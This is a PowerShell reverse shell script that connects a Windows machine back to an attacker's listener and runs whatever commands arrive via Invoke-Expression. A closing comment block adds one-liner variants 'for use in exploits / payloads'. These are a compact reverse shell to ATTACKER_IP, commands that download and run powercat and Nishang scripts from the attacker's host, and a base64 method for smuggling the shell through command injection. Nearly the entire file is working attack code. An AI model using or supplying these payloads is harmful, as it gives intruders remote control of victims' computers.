<#
.SYNOPSIS
    PowerShell Reverse Shell — TCP callback

.DESCRIPTION
    Connects back to attacker listener and provides an interactive shell.
    Multiple methods provided for different scenarios.

.PARAMETER IP
    Attacker IP address

.PARAMETER Port
    Attacker listening port (default: 4444)

.EXAMPLE
    # Start listener first: nc -lvnp 4444
    .\powershell_revshell.ps1 -IP 10.10.14.1 -Port 4444
#>

param(
    [Parameter(Mandatory=$true)]
    [string]$IP,
    [int]$Port = 4444
)

# ============================================================
# METHOD 1: TCP Client (most reliable)
# ============================================================

function Invoke-TCPRevShell {
    param([string]$Addr, [int]$P)

    $client = New-Object System.Net.Sockets.TCPClient($Addr, $P)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $buffer = New-Object System.Byte[] 1024
    $encoding = New-Object System.Text.ASCIIEncoding

    $writer.AutoFlush = $true
    $writer.WriteLine("Windows PowerShell Reverse Shell")
    $writer.WriteLine("PS $(Get-Location)> ")

    while ($client.Connected) {
        while ($stream.DataAvailable) {
            $rawData = $stream.Read($buffer, 0, $buffer.Length)
            $command = $encoding.GetString($buffer, 0, $rawData).Trim()

            if ($command -eq "exit") {
                $client.Close()
                return
            }

            try {
                $output = Invoke-Expression $command 2>&1 | Out-String
                $writer.Write($output)
            } catch {
                $writer.Write($_.Exception.Message)
            }
            $writer.WriteLine("`nPS $(Get-Location)> ")
        }
        Start-Sleep -Milliseconds 100
    }

    $client.Close()
}


# ============================================================
# Run
# ============================================================

Write-Host "[*] Reverse Shell connecting to ${IP}:${Port}..."
Invoke-TCPRevShell -Addr $IP -P $Port

<#
============================================================
ONE-LINER VARIANTS (for use in exploits / payloads)
============================================================

# Variant 1: Compact TCP reverse shell
$c=New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()

# Variant 2: Powercat (if available)
IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1');powercat -c ATTACKER_IP -p 4444 -e cmd.exe

# Variant 3: Base64 encoded (for command injection where special chars are problematic)
# Generate: $cmd = '<reverse shell oneliner>'; [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
# Execute:  powershell -enc <base64_string>

# Variant 4: Nishang Invoke-PowerShellTcp
# IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444
#>
